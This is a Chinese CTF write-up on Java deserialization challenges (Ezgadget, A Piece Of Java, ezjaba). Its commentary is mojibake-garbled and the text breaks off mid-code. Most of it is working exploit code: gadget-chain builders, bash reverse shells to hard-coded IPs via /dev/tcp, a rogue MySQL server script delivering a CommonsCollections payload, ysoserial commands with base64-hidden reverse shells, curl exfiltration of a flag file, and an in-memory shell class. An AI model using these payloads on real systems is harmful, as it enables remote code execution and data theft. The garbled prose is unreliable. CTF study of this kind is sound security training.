boolean exist = false; Cookie cookie = null; if(cookies != null) { Cookie[] encoder = cookies; int e = cookies.length; for(int bytes = 0; bytes è·å–çš„cookie å»ºç«‹ä¸€ä¸ªæ•°ç»„æ ¼å¼, ç„¶åå†ä¼ ç»™encoder æ•°ç»„, é€šè¿‡å¾ªç¯æ‰¾åˆ°cookie ä¸­æ˜¯å¦æœ‰å‘½åä¸º cinfo çš„cookie, æœ‰å°±èµ‹å€¼existä¸ºtrue, è¯»å–ç»“æŸç»§ç»­å¾€ä¸‹èµ° byte[] var20; if(exist) { String var16 = cookie.getValue(); Decoder var18 = Base64.getDecoder(); var20 = var18.decode(var16); ClientInfo var21 = null; if(!var16.equals(\"\") && var20 != null) { try { var21 = (ClientInfo)Tools.parse(var20); } catch (Exception var14) { var14.printStackTrace(); } } else { è¿™é‡Œexitåˆ¤ä¸ºtrueå°±èµ°if, ä¼šæŠŠcinfoå€¼ä¸‹çš„æ•°æ® base64 è§£å¯†, ç„¶åä¸ä¸ºç©ºå°±å¾€ if é‡Œé¢çš„ try èµ°, æ‰§è¡Œ (ClientInfo)Tools.parse(var20), elseçš„é‚£äº›å¾€ä¸‹èµ°è²Œä¼¼æ²¡æœ‰å¯åˆ©ç”¨çš„ç‚¹, å…ˆè·Ÿè¿› if é‡Œé¢çš„ Tools public class Tools implements Serializable { private static final long serialVersionUID = 1L; private String testCall; public static Object parse(byte[] bytes) throws Exception { ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes)); return ois.readObject(); } public static byte[] create(Object obj) throws Exception { ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(bos); outputStream.writeObject(obj); return bos.toByteArray(); } private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { Object obj = in.readObject(); (new ProcessBuilder((String[])((String[])obj))).start(); } } Javaçš„ååºåˆ—åŒ–å’ŒPHPååºåˆ—åŒ–ç±»ä¼¼ï¼Œphpåœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨å¯¹åº”ç±»çš„__wakeup()å‡½æ•°ï¼Œè€Œjavaä¼šè°ƒç”¨è¯¥ç±»readObject()å‡½æ•°ã€‚ å¯ä»¥çœ‹åˆ° readObject æ˜¯ä¸€ä¸ªå¾ˆå±é™©çš„åˆ©ç”¨ç‚¹, ç›´æ¥ååºåˆ—åŒ–æˆ‘ä»¬ä¼ å…¥çš„cinfoè§£å¯†çš„å€¼, æ— æ¡ä»¶å‘½ä»¤æ‰§è¡Œ Object obj = in.readObject(); (new ProcessBuilder((String[])((String[])obj))).start(); java.lang.ProcessBuilder.start() æ–¹æ³•ä½¿ç”¨æ­¤è¿›ç¨‹ç”Ÿæˆå™¨çš„å±æ€§æ¥å¯åŠ¨ä¸€ä¸ªæ–°è¿›ç¨‹ã€‚æ–°è¿›ç¨‹å°†è°ƒç”¨command()å‘½ä»¤å’Œå‚æ•°(å‡è®¾)ï¼Œåœ¨å·¥ä½œç›®å½•æ‰€ç»™å‡ºçš„directory()ï¼Œæœ‰ä¸€ä¸ªè¿‡ç¨‹çš„ç¯å¢ƒæ‰€ç»™å‡ºçš„environment()ã€‚æ­¤æ–¹æ³•æ£€æŸ¥è¯¥å‘½ä»¤æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„æ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚è¿™å‘½ä»¤æ˜¯æœ‰æ•ˆå–å†³äºç³»ç»Ÿï¼Œä½†æœ€èµ·ç çš„å‘½ä»¤å¿…é¡»éç©ºå­—ç¬¦ä¸²çš„éç©ºåˆ—è¡¨ã€‚ æ³•ä¸€: åœ¨javaä¸­readObjectå¯ä»¥ç›´æ¥è¯»å– writeObjectçš„å†…å®¹, ç”±æ­¤åœ¨Toolsç±»é‡å†™WriteObjectæ–¹æ³• private void writeObject(ObjectOutputStream out) throws IOException,ClassNotFoundException { String command[] = {\"bash\", \"-c\", \"bash -i>& /dev/tcp/39.97.114.43/8888 0>&1\"}; out.writeObject(command); } ç„¶åå»ºç«‹ payload public class Main { public static void main(String[] args) { Base64.Encoder encoder = Base64.getEncoder(); try { Tools cinfo = new Tools(); byte[] bytes = Tools.create(cinfo); String payload = encoder.encodeToString(bytes); System.out.println(payload); Tools.parse(bytes); } catch (Exception e) { e.printStackTrace(); } } } æ³•äºŒ: è®©objä¸ºToolsç§æœ‰å˜é‡çš„testCallï¼Œé€šè¿‡ClentInfoFilterè¿‡æ»¤å™¨ï¼Œå‡ºå‘Toolsç±»çš„parseæ–¹æ³•è°ƒç”¨Toolsç±»readObject()ï¼Œè¿›è€Œè°ƒç”¨ (new ProcessBuilder((String[])((String[])obj))).start(), ç”±æ­¤è®©testCallç­‰äºè¦è¿›è¡Œçš„å‘½ä»¤ï¼Œå°±å¯ä»¥RCEäº† package com.tools; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.IOException; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.Serializable; public class Tools implements Serializable { private static final long serialVersionUID = 1L; private String testCall[]; public static Object parse(byte[] bytes) throws Exception { ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes)); return ois.readObject(); } public static byte[] create(Object obj) throws Exception { ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(bos); outputStream.writeObject(obj); return bos.toByteArray(); } private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { Object obj = in.readObject(); (new ProcessBuilder((String[])obj)).start(); } public void setTestCall(String[] testCall) { this.testCall = testCall; } } èµ‹å€¼ç»™ testCall å†å†™å…¥å‘½ä»¤æ‰§è¡Œ public class Main { public static void main(String[] args) { Base64.Encoder encoder = Base64.getEncoder(); try { Tools cinfo = new Tools(); String commands[] = {\"bash\", \"-c\", \"bash -i>& /dev/tcp/39.97.114.43/8888 0>&1\"}; cinfo.setTestCall(commands); byte[] bytes = Tools.create(cinfo); String payload = encoder.encodeToString(bytes); System.out.println(payload); } catch (Exception e) { e.printStackTrace(); } } } ç„¶åä¿®æ”¹ cookie çš„ cinfo åˆ·æ–°å³å¯ [ä¸œåæ¯ 2021]Ezgadget åç¼–è¯‘, æŠŠå¯¼å‡ºçš„libåŒ… Add as library ä¹Ÿå°±æ˜¯ä½œä¸ºèµ„æºåŒ…(å¯è°ƒç”¨ç±»), ç„¶å debug ctfApplication è¿›è¡Œè°ƒè¯•, toolsä¸­æœ‰ä¸ªç±» ToStringBean package com.ezgame.ctf.tools; import java.io.*; public class ToStringBean extends ClassLoader implements Serializable { private byte[] ClassByte; @Override public String toString() { final ToStringBean toStringBean = new ToStringBean(); final Class clazz = toStringBean.defineClass(null, this.ClassByte, 0, this.ClassByte.length); Object Obj = null; try { Obj = clazz.newInstance(); } catch (InstantiationException e) { e.printStackTrace(); } catch (IllegalAccessException e2) { e2.printStackTrace(); } return \"enjoy it.\"; } } ä½¿ç”¨äº† defineClass, this.ClassByte å¯æ§, ç»™å‡ºä¸€ä¸ª defineClass åŠ è½½å­—èŠ‚ç çš„å®ä¾‹ import javassist.ClassPool; import javassist.CtClass; import java.lang.reflect.Method; public class Hello { public static void main(String[] args) throws Exception{ ClassPool classpool= ClassPool.getDefault(); CtClass hello = classpool.makeClass(\"Hello\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; hello.makeClassInitializer().insertBefore(cmd); byte[] classbyte = hello.toBytecode(); Method defineClass = ClassLoader.class.getDeclaredMethod(\"defineClass\", String.class, byte[].class, int.class, int.class); defineClass.setAccessible(true); Class testhello = (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), \"Hello\", classbyte, 0, classbyte.length); testhello.newInstance(); } } å¯ä»¥å¾—çŸ¥ defineClass(String.class, byte[].class, int.class, int.class); String.class æ˜¯åŠ è½½ç±»çš„å‘½å byte[].class å­˜æ”¾çš„æ˜¯ç±»çš„å­—èŠ‚ç  ç¬¬ä¸‰ä¸ª int.class é»˜è®¤ä¸º 0, çŒœæµ‹æ˜¯å¼€å§‹ä½ç½® ç¬¬å››ä¸ª int.class ä¼ å…¥å­—èŠ‚ç çš„é•¿åº¦ æœ¬é¢˜æˆ‘ä»¬éœ€è¦è§¦å‘ Tools ç±»ä¸­çš„ toString æ–¹æ³•æ¥è§¦å‘å­—èŠ‚ç åŠ è½½, å…¨å±€æœç´¢ jdk ä¸­ readObject è°ƒç”¨ toString æ–¹æ³•, å…¶å®å‘ç°CC5ä¸­æœ‰ä¸ª BadAttributeValueExpException å¯ä»¥è§¦å‘ toString private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ObjectInputStream.GetField gf = ois.readFields(); Object valObj = gf.get(\"val\", null); if (valObj == null) { val = null; } else if (valObj instanceof String) { val= valObj; } else if (System.getSecurityManager() == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean) { val = valObj.toString(); } else { // the serialized object is from a version without JDK-8019292 fix val = System.identityHashCode(valObj) + \"@\" + valObj.getClass().getName(); } } æˆ‘ä»¬åªéœ€è¦æ§åˆ¶ val ä¸º ToStringBean , ç„¶åæ§åˆ¶ ToStringBean ä¸­çš„ this.ClassByte ä¸ºæˆ‘ä»¬è‡ªå·±æ‰€æ„å»ºçš„å­—èŠ‚ç å³å¯, æ„é€  EXP package com.ezgame.ctf.controller; import com.ezgame.ctf.tools.ToStringBean; import javassist.ClassPool; import javassist.CtClass; import javax.management.BadAttributeValueExpException; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.net.URLEncoder; import java.util.Base64; public class Poctest { public static void main(String[] args) throws Exception{ ClassPool pool = ClassPool.getDefault(); CtClass evil = pool.makeClass(\"evil\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"bash -c bash$IFS$9-i>&/dev/tcp/169.254.191.77/23337 ç„¶åé€šè¿‡ /readObject?data= è§¦å‘ http://localhost:8888/readobject?data=rO0ABXcNAAdnYWRnZXRzAAAH5XNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAXNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAFnQAIWNvbS5lemdhbWUuY3RmLmNvbnRyb2xsZXIuUG9jdGVzdHQADFBvY3Rlc3QuamF2YXQABG1haW5zcgAmamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUxpc3T8DyUxteyOEAIAAUwABGxpc3RxAH4AB3hyACxqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlQ29sbGVjdGlvbhlCAIDLXvceAgABTAABY3QAFkxqYXZhL3V0aWwvQ29sbGVjdGlvbjt4cHNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAAAdwQAAAAAeHEAfgAVeHNyACFjb20uZXpnYW1lLmN0Zi50b29scy5Ub1N0cmluZ0JlYW4TzFRaJ9nceQIAAVsACUNsYXNzQnl0ZXQAAltCeHB1cgACW0Ks8xf4BghU4AIAAHhwAAABhMr%2Bur4AAAAxABkBAARldmlsBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEBAAg8Y2xpbml0PgEAAygpVgEABENvZGUBABFqYXZhL2xhbmcvUnVudGltZQcACgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAAwADQoACwAOAQA2YmFzaCAtYyBiYXNoJElGUyQ5LWk%2BJi9kZXYvdGNwLzE2OS4yNTQuMTkxLjc3LzIzMzM3PCYxCAAQAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAEgATCgALABQBAAY8aW5pdD4MABYACAoABAAXACEAAgAEAAAAAAACAAgABwAIAAEACQAAABYAAgAAAAAACrgADxIRtgAVV7EAAAAAAAEAFgAIAAEACQAAABEAAQABAAAABSq3ABixAAAAAAABAAUAAAACAAY%3D å³å¯getshell, æ­¤é¢˜è€ƒå¯Ÿçš„æ˜¯ java çš„ååºåˆ—åŒ–, è¿˜éœ€è¦å†å¯¹ java ååºåˆ—åŒ–æœ‰æ›´æ·±å…¥çš„äº†è§£ [ç¾ŠåŸæ¯ 2020]A Piece Of Java ç»™äº†jaråŒ…, åç¼–è¯‘åæŸ¥çœ‹, /hello æ¥å£å¯ä»¥ GET cookie ååºåˆ—åŒ– @GetMapping({\"/hello\"}) public String hello(@CookieValue(value = \"data\",required = false) String cookieData, Model model) { if (cookieData != null && !cookieData.equals(\"\")) { Info info = (Info)this.deserialize(cookieData); if (info != null) { model.addAttribute(\"info\", info.getAllInfo()); } return \"hello\"; } else { return \"redirect:/index\"; } } deserializeå¼€å§‹newäº†ä¸€ä¸ª SerialKiller private Object deserialize(String base64data) { ByteArrayInputStream bais = new ByteArrayInputStream(Base64.getDecoder().decode(base64data)); try { ObjectInputStream ois = new SerialKiller(bais, \"serialkiller.conf\"); Object obj = ois.readObject(); ois.close(); return obj; } catch (Exception var5) { var5.printStackTrace(); return null; } } } æ‰¾åˆ° .conf æ–‡ä»¶ gdufs\\..* java\\.lang\\..* ä¹Ÿå°±æ˜¯éœ€è¦æ»¡è¶³ç™½åå•æ‰å¯ä»¥è¿›è¡Œååºåˆ—åŒ–, libé‡Œé¢æœ‰ CC 3.2.1, ç„¶åå…ˆå»æŸ¥æ‰¾æ»¡è¶³ç™½åå•çš„ç±», å…¨å±€æœç´¢ Serializable, å¯ç”¨çš„ç±» gdufs.challenge.web.invocation.InfoInvocationHandler gdufs.challenge.web.model.DatabaseInfo å…¶ä¸­ DatabaseInfo çš„ checkAllInfo å¯ä»¥æ¶æ„è¿æ¥æ•°æ®åº“ public Boolean checkAllInfo() { if (this.host != null && this.port != null && this.username != null && this.password != null) { if (this.connection == null) { this.connect(); } return true; } else { return false; } } ç„¶åå› ä¸ºä»£ç†å¯¹è±¡åœ¨æ‰§è¡Œè¢«ä»£ç†å¯¹è±¡çš„ä»»ä½•æ–¹æ³•å‰éƒ½ä¼šæ‰§è¡Œé‡å†™çš„invokeæ–¹æ³•, è§¦å‘ InfoInvocationHandler ä¸­çš„ invoke ä»è€Œè°ƒç”¨ checkAllInfo public class InfoInvocationHandler implements InvocationHandler, Serializable { private Info info; public InfoInvocationHandler(Info info) { this.info = info; } public Object invoke(Object proxy, Method method, Object[] args) { try { return method.getName().equals(\"getAllInfo\") && !this.info.checkAllInfo() ? null : method.invoke(this.info, args); } catch (Exception var5) { var5.printStackTrace(); return null; } } } è¿™é‡Œå¯ä»¥å€Ÿæ­¤æ‰“ JDBC ååºåˆ—åŒ– å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶JDBCè¿æ¥è®¾ç½®é¡¹ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡è®¾ç½®å…¶æŒ‡å‘æ¶æ„MySQLæœåŠ¡å™¨è¿›è¡ŒObjectInputStream.readObject()çš„ååºåˆ—åŒ–æ”»å‡»ä»è€ŒRCEã€‚ å‚è€ƒ: https://www.mi1k7ea.com/2021/04/23/MySQL-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/ æ„é€ EXP package gdufs.challenge.web; import gdufs.challenge.web.invocation.InfoInvocationHandler; import gdufs.challenge.web.model.DatabaseInfo; import gdufs.challenge.web.model.Info; import java.io.ByteArrayOutputStream; import java.io.IOException; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Proxy; import java.util.Base64; public class exp { public static void main(String[] args) throws Exception { DatabaseInfo db = new DatabaseInfo(); db.setHost(\"81.70.101.91\"); db.setPort(\"9999\"); db.setUsername(\"root\"); db.setPassword(\"&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\"); ClassLoader classLoader = db.getClass().getClassLoader(); Class[] interfaces = db.getClass().getInterfaces(); InfoInvocationHandler invocationHandler = new InfoInvocationHandler(db); Info proxy = (Info) Proxy.newProxyInstance(classLoader, interfaces, invocationHandler); ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream obj = new ObjectOutputStream(baos); obj.writeObject(db); obj.flush(); obj.close(); String payload = new String(Base64.getEncoder().encode(baos.toByteArray())); System.out.println(payload); } } ç„¶åå…¬ç½‘å»ºç«‹æ¶æ„ mysql # coding=utf-8 import socket import binascii import os greeting_data=\"4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400\" response_ok_data=\"0700000200000002000000\" def receive_data(conn): data = conn.recv(1024) print(\"[*] Receiveing the package : {}\".format(data)) return str(data).lower() def send_data(conn,data): print(\"[*] Sending the package : {}\".format(data)) conn.send(binascii.a2b_hex(data)) def get_payload_content(): #fileæ–‡ä»¶çš„å†…å®¹ä½¿ç”¨ysoserialç”Ÿæˆçš„ ä½¿ç”¨è§„åˆ™ï¼šjava -jar ysoserial [Gadget] [command] > payload file= r'payload' if os.path.isfile(file): with open(file, 'rb') as f: payload_content = str(binascii.b2a_hex(f.read()),encoding='utf-8') print(\"open successs\") else: print(\"open false\") #calc payload_content='aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878' return payload_content # ä¸»è¦é€»è¾‘ def run(): while 1: conn, addr = sk.accept() print(\"Connection come from {}:{}\".format(addr[0],addr[1])) # 1.å…ˆå‘é€ç¬¬ä¸€ä¸ª é—®å€™æŠ¥æ–‡ send_data(conn,greeting_data) while True: # ç™»å½•è®¤è¯è¿‡ç¨‹æ¨¡æ‹Ÿ 1.å®¢æˆ·ç«¯å‘é€request loginæŠ¥æ–‡ 2.æœåŠ¡ç«¯å“åº”response_ok receive_data(conn) send_data(conn,response_ok_data) #å…¶ä»–è¿‡ç¨‹ data=receive_data(conn) #æŸ¥è¯¢ä¸€äº›é…ç½®ä¿¡æ¯,å…¶ä¸­ä¼šå‘é€è‡ªå·±çš„ ç‰ˆæœ¬å· if \"session.auto_increment_increment\" in data: _payload='01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000' send_data(conn,_payload) data=receive_data(conn) elif \"show warnings\" in data: _payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000' send_data(conn, _payload) data = receive_data(conn) if \"set names\" in data: send_data(conn, response_ok_data) data = receive_data(conn) if \"set character_set_results\" in data: send_data(conn, response_ok_data) data = receive_data(conn) if \"show session status\" in data: mysql_data = '0100000102' mysql_data += '1a000002036465660001630163016301630c3f00ffff0000fc9000000000' mysql_data += '1a000003036465660001630163016301630c3f00ffff0000fc9000000000' # ä¸ºä»€ä¹ˆæˆ‘åŠ äº†EOF Packet å°±æ— æ³•æ­£å¸¸è¿è¡Œå‘¢ï¼Ÿï¼Ÿ # è·å–payload payload_content=get_payload_content() # è®¡ç®—payloadé•¿åº¦ payload_length = str(hex(len(payload_content)//2)).replace('0x', '').zfill(4) payload_length_hex = payload_length[2:4] + payload_length[0:2] # è®¡ç®—æ•°æ®åŒ…é•¿åº¦ data_len = str(hex(len(payload_content)//2 + 4)).replace('0x', '').zfill(6) data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2] mysql_data += data_len_hex + '04' + 'fbfc'+ payload_length_hex mysql_data += str(payload_content) mysql_data += '07000005fe000022000100' send_data(conn, mysql_data) data = receive_data(conn) if \"show warnings\" in data: payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000' send_data(conn, payload) break if __name__ == '__main__': HOST ='0.0.0.0' PORT = 9999 sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #å½“socketå…³é—­åï¼Œæœ¬åœ°ç«¯ç”¨äºè¯¥socketçš„ç«¯å£å·ç«‹åˆ»å°±å¯ä»¥è¢«é‡ç”¨.ä¸ºäº†å®éªŒçš„æ—¶å€™ä¸ç”¨ç­‰å¾…å¾ˆé•¿æ—¶é—´ sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sk.bind((HOST, PORT)) sk.listen(1) print(\"start fake mysql server listening on {}:{}\".format(HOST,PORT)) run() ysoserial java -jar ysoserial.jar CommonsCollections5 \"bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC84MS43MC4xMDEuOTEvODg4OCAwJj4xJw==}|{base64,-d}|{bash,-i}\" > payload ä½†æ˜¯åå¼¹shellä¸å¤ªè¡Œ, å°±é€šè¿‡ curl æ•°æ®å¤–å¸¦ java -jar ysoserial.jar CommonsCollections5 \"bash -c {echo,Y3VybCAtWCBQT1NUIC1kICJmbGFnPWBjYXQgL2ZsYWdfQVFVQWAiIGh0dHA6Ly8zOS45Ny4xMTQuNDM6ODg4OA==}|{base64,-d}|{bash,-i}\" > payload è®¿é—® /hello, data=Proxypayload å³å¯ [é™‡åŸæˆ˜\"ç–«\"]ezjaba é¢˜ç›®é“¾æ¥(web-ezjaba): https://buuoj.cn/match/matches/57/challenges jaråŒ…åç¼–è¯‘åå¯ä»¥çœ‹åˆ° pom.xml ä¸­æœ‰ rome ä¾èµ– rome rome 1.0 ROMEååºåˆ—åŒ–, è¿‡æ»¤äº†ä¸¤ä¸ªç±» java.util.HashMap javax.management.BadAttributeValueExpException ä½†æ˜¯BackDooråº•ä¸‹çš„finallyå®Œæˆäº†BadAttributeValueExpExceptionç±»éœ€è¦åšçš„äº‹, å¯ä»¥ç›´æ¥è§¦å‘toString, åŸæ¥çš„ROMEé“¾ å‚è€ƒ: https://blog.csdn.net/rfrder/article/details/121236409 TemplatesImpl.getOutputProperties() NativeMethodAccessorImpl.invoke0(Method, Object, Object[]) NativeMethodAccessorImpl.invoke(Object, Object[]) DelegatingMethodAccessorImpl.invoke(Object, Object[]) Method.invoke(Object, Object...) ToStringBean.toString(String) ToStringBean.toString() ObjectBean.toString() EqualsBean.beanHashCode() ObjectBean.hashCode() HashMap.hash(Object) HashMap.readObject(ObjectInputStream) ç›´æ¥æˆªæ–­ä»ToStringBeanå¤„å¼€å§‹æ„å»º, å³å¯ç›´æ¥è§¦å‘, åŸé¢˜ä¸å‡ºç½‘, æ‰€ä»¥éœ€è¦è®¾ç½®å†…å­˜é©¬, å°æ”¹ä¸€ä¸‹å³å¯ä½¿ç”¨ package com.lyzy.ctf.ezjaba.exp; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.lang.reflect.Method; import java.util.Scanner; public class SpringEcho extends AbstractTranslet { static { try { Class c = Thread.currentThread().getContextClassLoader().loadClass(\"org.springframework.web.context.request.RequestContextHolder\"); Method m = c.getMethod(\"getRequestAttributes\"); Object o = m.invoke(null); c = Thread.currentThread().getContextClassLoader().loadClass(\"org.springframework.web.context.request.ServletRequestAttributes\"); m = c.getMethod(\"getResponse\"); // Method m1 = c.getMethod(\"getRequest\"); Object resp = m.invoke(o); // Object req = m1.invoke(o); // HttpServletRequest Method getWriter = Thread.currentThread().getContextClassLoader().loadClass(\"javax.servlet.ServletResponse\").getDeclaredMethod(\"getWriter\"); // Method getHeader = 